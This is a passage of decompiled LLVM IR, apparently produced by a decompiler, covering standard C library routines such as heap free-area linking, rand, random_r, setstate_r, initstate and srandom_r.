  %v2_10005fd0 = sub i32 %v0_1000600c.lcssa, %v2_10005fcc
  %v1_10005fd4 = add i32 %v2_10005fd0, 12
  %v3_10005fd8 = icmp ugt i32 %v1_10005fd4, %v2_10005fa0
  br i1 %v3_10005fd8, label %dec_label_pc_1000607c, label %dec_label_pc_10005fe0

dec_label_pc_10005fe0:                            ; preds = %dec_label_pc_10005fcc
  %v4_10005fd8 = icmp eq i32 %v1_10005fd4, %v2_10005fa0
  %v2_10005fe4 = add i32 %v2_10005fcc, %arg3
  store i32 %v2_10005fe4, i32* @r29, align 4
  br i1 %v4_10005fd8, label %dec_label_pc_10005fec, label %dec_label_pc_1000601c

dec_label_pc_10005fec:                            ; preds = %dec_label_pc_10005fe0
  %v3_10005fec = icmp eq i32 %v0_10006000.lcssa, 0
  br i1 %v3_10005fec, label %dec_label_pc_10006070, label %dec_label_pc_10005ff4

dec_label_pc_10005ff4:                            ; preds = %dec_label_pc_10005fec
  %v1_10005ff4 = add i32 %v0_10006000.lcssa, 12
  %v4_10005ff8 = icmp eq i32 %v1_10005ff4, %arg2
  br i1 %v4_10005ff8, label %dec_label_pc_10006000, label %dec_label_pc_10006070

dec_label_pc_10006000:                            ; preds = %dec_label_pc_10005ff4
  %v1_10006000 = inttoptr i32 %v0_10006000.lcssa to i32*
  %v2_10006000 = load i32, i32* %v1_10006000, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_10006008 = add i32 %v0_10006000.lcssa, 8
  %v2_10006008 = inttoptr i32 %v1_10006008 to i32*
  %v3_10006008 = load i32, i32* %v2_10006008, align 4
  %v2_10006010 = add i32 %v2_10006000, %v2_10005fe4
  store i32 %v2_10006010, i32* @r29, align 4
  %v5_10006014 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1000600c.lcssa, i32 %v3_10006008, i32 %v2_10005fa0)
  store i32 %v5_10006014, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006070

dec_label_pc_1000601c:                            ; preds = %dec_label_pc_10005fe0
  %v1_1000601c = add i32 %v0_1000600c.lcssa, 4
  %v2_1000601c = inttoptr i32 %v1_1000601c to i32*
  %v3_1000601c = load i32, i32* %v2_1000601c, align 4
  %v3_10006020 = icmp eq i32 %v3_1000601c, 0
  br i1 %v3_10006020, label %dec_label_pc_10006058, label %dec_label_pc_10006028

dec_label_pc_10006028:                            ; preds = %dec_label_pc_1000601c
  %v1_10006028 = inttoptr i32 %v3_1000601c to i32*
  %v2_10006028 = load i32, i32* %v1_10006028, align 4
  %v2_1000602c = sub i32 %v3_1000601c, %v2_10006028
  %v1_10006030 = add i32 %v2_1000602c, 12
  %v4_10006034 = icmp eq i32 %v2_10005fa0, %v1_10006030
  br i1 %v4_10006034, label %dec_label_pc_1000603c, label %dec_label_pc_10006058

dec_label_pc_1000603c:                            ; preds = %dec_label_pc_10006028
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10006048 = add i32 %v2_10006028, %v2_10005fe4
  store i32 %v2_10006048, i32* @r29, align 4
  store i32 %v3_1000601c, i32* @r31, align 4
  %v5_10006050 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1000601c, i32 %v0_10006000.lcssa, i32 %v2_10005fa0)
  store i32 %v5_10006050, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006070

dec_label_pc_10006058:                            ; preds = %dec_label_pc_10006028, %dec_label_pc_1000601c
  %v2_10006058 = add i32 %v0_1000600c.lcssa, %arg3
  store i32 %v2_10006058, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268460144, i32* @lr, align 4
  %v5_1000606c = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_10006058, i32 %v0_10006000.lcssa, i32 %v3_1000601c)
  store i32 %v5_1000606c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006070

dec_label_pc_10006070:                            ; preds = %dec_label_pc_10005ff4, %dec_label_pc_10005fec, %dec_label_pc_1000603c, %dec_label_pc_10006000, %dec_label_pc_10006058
  %v0_10006070 = load i32, i32* @r31, align 4
  store i32 %v0_10006070, i32* @r30, align 4
  %v0_10006074 = load i32, i32* @r29, align 4
  %v2_10006074 = inttoptr i32 %v0_10006070 to i32*
  store i32 %v0_10006074, i32* %v2_10006074, align 4
  br label %dec_label_pc_10006098

dec_label_pc_1000607c:                            ; preds = %dec_label_pc_10005fcc, %dec_label_pc_10005fc4
  %v2_1000607c = add i32 %v2_10005fa0, -12
  %v3_1000607c = inttoptr i32 %v2_1000607c to i32*
  store i32 %arg3, i32* %v3_1000607c, align 4
  %v0_10006080 = load i32, i32* %r3.global-to-local, align 4
  %v1_10006080 = add i32 %v0_10006080, -12
  store i32 %v1_10006080, i32* @r30, align 4
  %v0_10006084 = load i32, i32* %r11.global-to-local, align 4
  %v0_10006088 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10006088, i32* %r3.global-to-local, align 4
  %v0_1000608c = load i32, i32* @r31, align 4
  store i32 268460184, i32* @lr, align 4
  %v4_10006094 = inttoptr i32 %v0_10006088 to i32*
  %v5_10006094 = call i32 @__heap_link_free_area(i32* %v4_10006094, i32 %v1_10006080, i32 %v0_10006084, i32 %v0_1000608c)
  store i32 %v5_10006094, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006098

dec_label_pc_10006098:                            ; preds = %dec_label_pc_10006070, %dec_label_pc_1000607c
  %v0_1000609c = load i32, i32* @r30, align 4
  store i32 %v0_1000609c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000609c

; uselistorder directives
  uselistorder i32 %v3_1000601c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_10005fd4, { 1, 0 }
  uselistorder i32 %v0_1000600c.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_10006000.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_10005fb0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_10005fa0, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10006098, { 1, 0 }
  uselistorder label %dec_label_pc_10006070, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10005fac, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_100060b0 = call i32 @random()
  ret i32 %v0_100060b0

; uselistorder directives
  uselistorder i32 ()* @random, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_100060cc = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_1001d6d8.400 to i32), i32* @r29, align 4
  store i32 %v2_100060cc, i32* @r3, align 4
  %v0_100060e0 = call i32 @__pthread_return_void()
  %v0_100060e8 = call i32 @__pthread_return_0()
  %v2_100060f0 = ptrtoint i32* %stack_var_-56 to i32
  %v3_100060f8 = call i32 @__GI_random_r(i32* inttoptr (i32 268556016 to i32*), i32 %v2_100060f0)
  store i32 %v2_100060cc, i32* @r3, align 4
  %v0_10006104 = call i32 @__pthread_return_void()
  %v3_1000610c = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000610c
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001d6d8.400 to i32), i32* %r29.global-to-local, align 4
  %v2_10006144 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006144, i32* @r3, align 4
  %v0_1000614c = call i32 @__pthread_return_void()
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10006158 = call i32 @__pthread_return_0()
  store i32 268460404, i32* @lr, align 4
  %v3_10006170 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1001d6f0)
  %v1_10006178 = icmp slt i32 %v3_10006170, 0
  store i32 %v2_10006144, i32* @r3, align 4
  br i1 %v1_10006178, label %dec_label_pc_10006188, label %dec_label_pc_10006184

dec_label_pc_10006184:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1001d6f4.404 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10006188

dec_label_pc_10006188:                            ; preds = %entry, %dec_label_pc_10006184
  %v0_10006188 = call i32 @__pthread_return_void()
  %v0_10006190 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_10006190

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10006188, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_100061b4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100061b4, i32* @r3, align 4
  %v0_100061dc = call i32 @__pthread_return_void()
  %v0_100061e4 = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268460548, i32* @lr, align 4
  %v4_10006200 = inttoptr i32 %arg1 to i32*
  %v5_10006200 = call i32 @__GI_initstate_r(i32* %v4_10006200, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_1001d6f0 to i32))
  store i32 %v2_100061b4, i32* @r3, align 4
  %v0_1000620c = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_1001d6f4.404 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10006244 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006244, i32* @r3, align 4
  %v0_1000625c = call i32 @__pthread_return_void()
  %v0_10006264 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_1001d6f0 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268460664, i32* @lr, align 4
  %v0_10006274 = call i32 @srandom_r()
  store i32 %v2_10006244, i32* @r3, align 4
  %v0_10006280 = call i32 @__pthread_return_void()
  ret i32 %v0_10006280

; uselistorder directives
  uselistorder i32* @global_var_1001d6f0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001d6f0 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10006298 = add i32 %tmp, 12
  %v2_10006298 = inttoptr i32 %v1_10006298 to i32*
  %v3_10006298 = load i32, i32* %v2_10006298, align 4
  store i32 %v3_10006298, i32* %r11.global-to-local, align 4
  %v0_1000629c = load i32, i32* @lr, align 4
  store i32 %v0_1000629c, i32* %r0.global-to-local, align 4
  %v1_100062a4 = add i32 %arg1, 4
  store i32 %v1_100062a4, i32* %r3.global-to-local, align 4
  %v1_100062a8 = add i32 %tmp, 8
  %v2_100062a8 = inttoptr i32 %v1_100062a8 to i32*
  %v3_100062a8 = load i32, i32* %v2_100062a8, align 4
  store i32 %v3_100062a8, i32* %r9.global-to-local, align 4
  %v3_100062ac = icmp eq i32 %v3_10006298, 0
  br i1 %v3_100062ac, label %dec_label_pc_100062b8, label %dec_label_pc_100062c0

dec_label_pc_100062b8:                            ; preds = %entry
  %v2_100062b8 = add i32 %v3_100062a8, -4
  %v3_100062b8 = inttoptr i32 %v2_100062b8 to i32*
  store i32 0, i32* %v3_100062b8, align 4
  br label %dec_label_pc_100062d8

dec_label_pc_100062c0:                            ; preds = %entry
  %v1_100062c0 = add i32 %tmp, 4
  %v2_100062c0 = inttoptr i32 %v1_100062c0 to i32*
  %v3_100062c0 = load i32, i32* %v2_100062c0, align 4
  %v2_100062c4 = sub i32 %v3_100062c0, %v3_100062a8
  %v4_100062c8 = sdiv i32 %v2_100062c4, 4
  %v1_100062cc = mul i32 %v4_100062c8, 5
  %v2_100062d0 = add i32 %v1_100062cc, %v3_10006298
  store i32 %v2_100062d0, i32* %r0.global-to-local, align 4
  %v2_100062d4 = add i32 %v3_100062a8, -4
  %v3_100062d4 = inttoptr i32 %v2_100062d4 to i32*
  store i32 %v2_100062d0, i32* %v3_100062d4, align 4
  br label %dec_label_pc_100062d8

dec_label_pc_100062d8:                            ; preds = %dec_label_pc_100062b8, %dec_label_pc_100062c0
  %v0_100062d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100062d8 = add i32 %v0_100062d8, -4
  %v2_100062d8 = inttoptr i32 %v1_100062d8 to i32*
  %v3_100062d8 = load i32, i32* %v2_100062d8, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000c8e0.405 to i32), i32* %r9.global-to-local, align 4
  %v2_100062ec = srem i32 %v3_100062d8, 5
  store i32 %v2_100062ec, i32* %r11.global-to-local, align 4
  %v2_100062f8 = icmp ugt i32 %v2_100062ec, 4
  %v1_100062fc = mul nsw i32 %v2_100062ec, 4
  store i32 %v1_100062fc, i32* %r0.global-to-local, align 4
  %v2_10006300 = add i32 %v1_100062fc, ptrtoint (i32* @global_var_1000c8e0.405 to i32)
  store i32 %v2_10006300, i32* %r10.global-to-local, align 4
  br i1 %v2_100062f8, label %dec_label_pc_10006368, label %dec_label_pc_1000630c

dec_label_pc_1000630c:                            ; preds = %dec_label_pc_100062d8
  %v3_10006304 = icmp eq i32 %v2_100062ec, 0
  %v1_1000630c = add i32 %v1_100062fc, add (i32 ptrtoint (i32* @global_var_1000c8e0.405 to i32), i32 20)
  %v2_1000630c = inttoptr i32 %v1_1000630c to i32*
  %v3_1000630c = load i32, i32* %v2_1000630c, align 4
  store i32 %v3_1000630c, i32* %r10.global-to-local, align 4
  %v3_10006310 = inttoptr i32 %v2_10006300 to i32*
  %v4_10006310 = load i32, i32* %v3_10006310, align 4
  store i32 %v4_10006310, i32* %r9.global-to-local, align 4
  store i32 %v2_100062ec, i32* %v2_10006298, align 4
  %v0_10006318 = load i32, i32* %r10.global-to-local, align 4
  %v1_10006318 = mul i32 %v0_10006318, 4
  store i32 %v1_10006318, i32* %r0.global-to-local, align 4
  %v2_1000631c = add i32 %tmp, 16
  %v3_1000631c = inttoptr i32 %v2_1000631c to i32*
  store i32 %v0_10006318, i32* %v3_1000631c, align 4
  %v0_10006320 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006320 = add i32 %tmp, 20
  %v3_10006320 = inttoptr i32 %v2_10006320 to i32*
  store i32 %v0_10006320, i32* %v3_10006320, align 4
  %v0_10006324 = load i32, i32* %r3.global-to-local, align 4
  %v1_10006324 = load i32, i32* %r0.global-to-local, align 4
  %v2_10006324 = add i32 %v1_10006324, %v0_10006324
  store i32 %v2_10006324, i32* %r8.global-to-local, align 4
  br i1 %v3_10006304, label %dec_label_pc_1000635c, label %dec_label_pc_1000632c

dec_label_pc_1000632c:                            ; preds = %dec_label_pc_1000630c
  %v1_1000632c = add i32 %v0_10006324, -4
  %v2_1000632c = inttoptr i32 %v1_1000632c to i32*
  %v3_1000632c = load i32, i32* %v2_1000632c, align 4
  %v1_10006330 = load i32, i32* %r7.global-to-local, align 4
  %v2_10006330 = sdiv i32 %v3_1000632c, %v1_10006330
  %v1_10006334 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006334 = add i32 %v1_10006334, %v2_10006330
  store i32 %v2_10006334, i32* %r9.global-to-local, align 4
  %v1_10006338 = mul i32 %v2_10006330, 4
  %v1_1000633c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000633c = sdiv i32 %v2_10006334, %v1_1000633c
  store i32 %v2_1000633c, i32* %r11.global-to-local, align 4
  %v2_10006340 = add i32 %v1_10006338, %v0_10006324
  store i32 %v2_10006340, i32* %r0.global-to-local, align 4
  %v2_10006344 = add i32 %tmp, 4
  %v3_10006344 = inttoptr i32 %v2_10006344 to i32*
  store i32 %v2_10006340, i32* %v3_10006344, align 4
  %v0_10006348 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006348 = load i32, i32* %r10.global-to-local, align 4
  %v2_10006348 = mul i32 %v1_10006348, %v0_10006348
  store i32 %v2_10006348, i32* %r11.global-to-local, align 4
  %v1_1000634c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000634c = sub i32 %v1_1000634c, %v2_10006348
  %v1_10006350 = mul i32 %v2_1000634c, 4
  %v0_10006354 = load i32, i32* %r3.global-to-local, align 4
  %v2_10006354 = add i32 %v1_10006350, %v0_10006354
  store i32 %v2_10006354, i32* %r9.global-to-local, align 4
  store i32 %v2_10006354, i32* %arg2, align 4
  %v0_1000635c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000635c

dec_label_pc_1000635c:                            ; preds = %dec_label_pc_1000630c, %dec_label_pc_1000632c
  %v0_1000635c = phi i32 [ %v2_10006324, %dec_label_pc_1000630c ], [ %v0_1000635c.pre, %dec_label_pc_1000632c ]
  %v2_1000635c = add i32 %tmp, 24
  %v3_1000635c = inttoptr i32 %v2_1000635c to i32*
  store i32 %v0_1000635c, i32* %v3_1000635c, align 4
  %v0_10006360 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10006360, i32* %v2_100062a8, align 4
  %v0_1000637c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10006378

dec_label_pc_10006368:                            ; preds = %dec_label_pc_100062d8
  %v0_10006368 = call i32 @__errno_location()
  store i32 %v0_10006368, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10006370 = inttoptr i32 %v0_10006368 to i32*
  store i32 22, i32* %v2_10006370, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10006378

dec_label_pc_10006378:                            ; preds = %dec_label_pc_1000635c, %dec_label_pc_10006368
  %v0_1000637c = phi i32 [ %v0_1000637c.pre, %dec_label_pc_1000635c ], [ -1, %dec_label_pc_10006368 ]
  store i32 %v0_1000629c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000637c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000637c

; uselistorder directives
  uselistorder i32 %v0_1000637c, { 1, 0 }
  uselistorder i32 %v0_10006324, { 0, 2, 1 }
  uselistorder i32 %v0_10006318, { 1, 0 }
  uselistorder i32 %v1_100062fc, { 2, 1, 0 }
  uselistorder i32 %v2_100062ec, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v3_100062a8, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 6, 0, 3, 5, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_10006378, { 1, 0 }
  uselistorder label %dec_label_pc_1000635c, { 1, 0 }
  uselistorder label %dec_label_pc_100062d8, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000638c = add i32 %tmp, 12
  %v2_1000638c = inttoptr i32 %v1_1000638c to i32*
  %v3_1000638c = load i32, i32* %v2_1000638c, align 4
  %v1_10006398 = add i32 %tmp, 8
  %v2_10006398 = inttoptr i32 %v1_10006398 to i32*
  %v3_10006398 = load i32, i32* %v2_10006398, align 4
  store i32 %v3_10006398, i32* %r7.global-to-local, align 4
  %v3_1000639c = icmp eq i32 %v3_1000638c, 0
  br i1 %v3_1000639c, label %dec_label_pc_100063a4, label %dec_label_pc_100063c0

dec_label_pc_100063a4:                            ; preds = %entry
  %v1_100063a4 = inttoptr i32 %v3_10006398 to i32*
  %v2_100063a4 = load i32, i32* %v1_100063a4, align 4
  %v2_100063a8 = mul i32 %v2_100063a4, 1103515245
  %v1_100063ac = add i32 %v2_100063a8, 12345
  %v1_100063b0 = urem i32 %v1_100063ac, -2147483648
  store i32 %v1_100063b0, i32* %r9.global-to-local, align 4
  store i32 %v1_100063b0, i32* %v1_100063a4, align 4
  %v0_100063b8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100063b8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_100063b8, i32* %v2_100063b8, align 4
  br label %dec_label_pc_10006414

dec_label_pc_100063c0:                            ; preds = %entry
  %v2_100063c0 = load i32, i32* %arg1, align 4
  %v1_100063c4 = add i32 %tmp, 4
  %v2_100063c4 = inttoptr i32 %v1_100063c4 to i32*
  %v3_100063c4 = load i32, i32* %v2_100063c4, align 4
  store i32 %v3_100063c4, i32* %r9.global-to-local, align 4
  %v1_100063c8 = add i32 %tmp, 24
  %v2_100063c8 = inttoptr i32 %v1_100063c8 to i32*
  %v3_100063c8 = load i32, i32* %v2_100063c8, align 4
  %v1_100063cc = add i32 %v2_100063c0, 4
  store i32 %v1_100063cc, i32* %r8.global-to-local, align 4
  %v1_100063d0 = add i32 %v3_100063c4, 4
  %v1_100063d4 = inttoptr i32 %v3_100063c4 to i32*
  %v2_100063d4 = load i32, i32* %v1_100063d4, align 4
  store i32 %v2_100063d4, i32* %r9.global-to-local, align 4
  store i32 %v1_100063d0, i32* %r10.global-to-local, align 4
  %v2_100063e0 = icmp ult i32 %v1_100063cc, %v3_100063c8
  %v1_100063e4 = inttoptr i32 %v2_100063c0 to i32*
  %v2_100063e4 = load i32, i32* %v1_100063e4, align 4
  %v2_100063e8 = add i32 %v2_100063e4, %v2_100063d4
  %v1_100063ec = udiv i32 %v2_100063e8, 2
  store i32 %v1_100063ec, i32* %r9.global-to-local, align 4
  store i32 %v2_100063e8, i32* %v1_100063e4, align 4
  %v0_100063f4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100063f4 = inttoptr i32 %arg2 to i32*
  store i32 %v0_100063f4, i32* %v2_100063f4, align 4
  br i1 %v2_100063e0, label %dec_label_pc_10006404, label %dec_label_pc_100063fc

dec_label_pc_100063fc:                            ; preds = %dec_label_pc_100063c0
  %v0_100063fc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_100063fc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000640c

dec_label_pc_10006404:                            ; preds = %dec_label_pc_100063c0
  %v2_100063d8 = icmp ult i32 %v1_100063d0, %v3_100063c8
  br i1 %v2_100063d8, label %dec_label_pc_1000640c, label %dec_label_pc_10006408

dec_label_pc_10006408:                            ; preds = %dec_label_pc_10006404
  %v0_10006408 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10006408, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000640c

dec_label_pc_1000640c:                            ; preds = %dec_label_pc_10006404, %dec_label_pc_100063fc, %dec_label_pc_10006408
  %v0_1000640c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000640c, i32* %v2_100063c4, align 4
  %v0_10006410 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10006410, i32* %arg1, align 4
  br label %dec_label_pc_10006414

dec_label_pc_10006414:                            ; preds = %dec_label_pc_100063a4, %dec_label_pc_1000640c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_100063e8, { 1, 0 }
  uselistorder i32 %v1_100063d0, { 1, 0 }
  uselistorder i32 %v3_100063c8, { 1, 0 }
  uselistorder i32 %v3_100063c4, { 1, 0, 2 }
  uselistorder i32 %v1_100063b0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006414, { 1, 0 }
  uselistorder label %dec_label_pc_1000640c, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10006420 = load i32, i32* @lr, align 4
  store i32 %v0_10006420, i32* %r0.global-to-local, align 4
  %v0_1000642c = load i32, i32* @r4, align 4
  store i32 %v0_1000642c, i32* @r30, align 4
  %v1_10006434 = add i32 %v0_1000642c, 12
  %v2_10006434 = inttoptr i32 %v1_10006434 to i32*
  %v3_10006434 = load i32, i32* %v2_10006434, align 4
  store i32 %v3_10006434, i32* %r0.global-to-local, align 4
  %v2_10006438 = icmp ugt i32 %v3_10006434, 4
  br i1 %v2_10006438, label %dec_label_pc_100064e8, label %dec_label_pc_10006440

dec_label_pc_10006440:                            ; preds = %entry
  %v0_10006440 = load i32, i32* @r3, align 4
  %v3_10006440 = icmp eq i32 %v0_10006440, 0
  %v1_10006444 = add i32 %v0_1000642c, 8
  %v2_10006444 = inttoptr i32 %v1_10006444 to i32*
  %v3_10006444 = load i32, i32* %v2_10006444, align 4
  store i32 %v3_10006444, i32* %r10.global-to-local, align 4
  br i1 %v3_10006440, label %dec_label_pc_1000644c, label %dec_label_pc_10006450

dec_label_pc_1000644c:                            ; preds = %dec_label_pc_10006440
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_10006450

dec_label_pc_10006450:                            ; preds = %dec_label_pc_10006440, %dec_label_pc_1000644c
  %v0_10006454 = phi i32 [ %v0_10006440, %dec_label_pc_10006440 ], [ 1, %dec_label_pc_1000644c ]
  %v3_10006450 = icmp eq i32 %v3_10006434, 0
  %v2_10006454 = inttoptr i32 %v3_10006444 to i32*
  store i32 %v0_10006454, i32* %v2_10006454, align 4
  br i1 %v3_10006450, label %dec_label_pc_100064e4, label %dec_label_pc_1000645c

dec_label_pc_1000645c:                            ; preds = %dec_label_pc_10006450
  %v0_1000645c = load i32, i32* @r30, align 4
  %v1_1000645c = add i32 %v0_1000645c, 16
  %v2_1000645c = inttoptr i32 %v1_1000645c to i32*
  %v3_1000645c = load i32, i32* %v2_1000645c, align 4
  store i32 %v3_1000645c, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_10006470 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_1000645c, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1000645c, 0
  br i1 %tmp18, label %dec_label_pc_100064b0.preheader, label %dec_label_pc_100064b0.preheader.thread

dec_label_pc_100064b0.preheader.thread:           ; preds = %dec_label_pc_1000645c
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100064b4

dec_label_pc_100064b0.preheader:                  ; preds = %dec_label_pc_1000645c
  %v1_100064b02 = add i32 %v3_1000645c, -1
  store i32 %v1_100064b02, i32* %ctr.global-to-local, align 4
  %v2_100064b03 = icmp eq i32 %v1_100064b02, 0
  br i1 %v2_100064b03, label %dec_label_pc_100064b4, label %dec_label_pc_1000648c

dec_label_pc_1000648c:                            ; preds = %dec_label_pc_100064b0.preheader, %dec_label_pc_100064ac.dec_label_pc_1000648c_crit_edge
  %v1_100064ac = phi i32 [ %v2_100064ac, %dec_label_pc_100064ac.dec_label_pc_1000648c_crit_edge ], [ %v0_10006470, %dec_label_pc_100064b0.preheader ]
  %v1_1000648c = phi i32 [ %v1_1000648c.pre, %dec_label_pc_100064ac.dec_label_pc_1000648c_crit_edge ], [ 127773, %dec_label_pc_100064b0.preheader ]
  %v0_1000648c = load i32, i32* @r3, align 4
  %v2_1000648c = sdiv i32 %v0_1000648c, %v1_1000648c
  %v2_10006490 = mul i32 %v2_1000648c, %v1_1000648c
  %v1_10006494 = mul i32 %v2_1000648c, 2836
  store i32 %v1_10006494, i32* %r0.global-to-local, align 4
  %v2_10006498 = sub i32 %v0_1000648c, %v2_10006490
  %v1_1000649c = mul i32 %v2_10006498, 16807
  %v2_100064a0 = sub i32 %v1_1000649c, %v1_10006494
  store i32 %v2_100064a0, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_100064a0, -1
  br i1 %tmp19, label %dec_label_pc_100064ac, label %dec_label_pc_100064a8

dec_label_pc_100064a8:                            ; preds = %dec_label_pc_1000648c
  %v1_100064a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_100064a8 = add i32 %v1_100064a8, %v2_100064a0
  store i32 %v2_100064a8, i32* @r3, align 4
  br label %dec_label_pc_100064ac

dec_label_pc_100064ac:                            ; preds = %dec_label_pc_1000648c, %dec_label_pc_100064a8
  %v0_100064ac = phi i32 [ %v2_100064a0, %dec_label_pc_1000648c ], [ %v2_100064a8, %dec_label_pc_100064a8 ]
  %v2_100064ac = add i32 %v1_100064ac, 4
  %v3_100064ac = inttoptr i32 %v2_100064ac to i32*
  store i32 %v0_100064ac, i32* %v3_100064ac, align 4
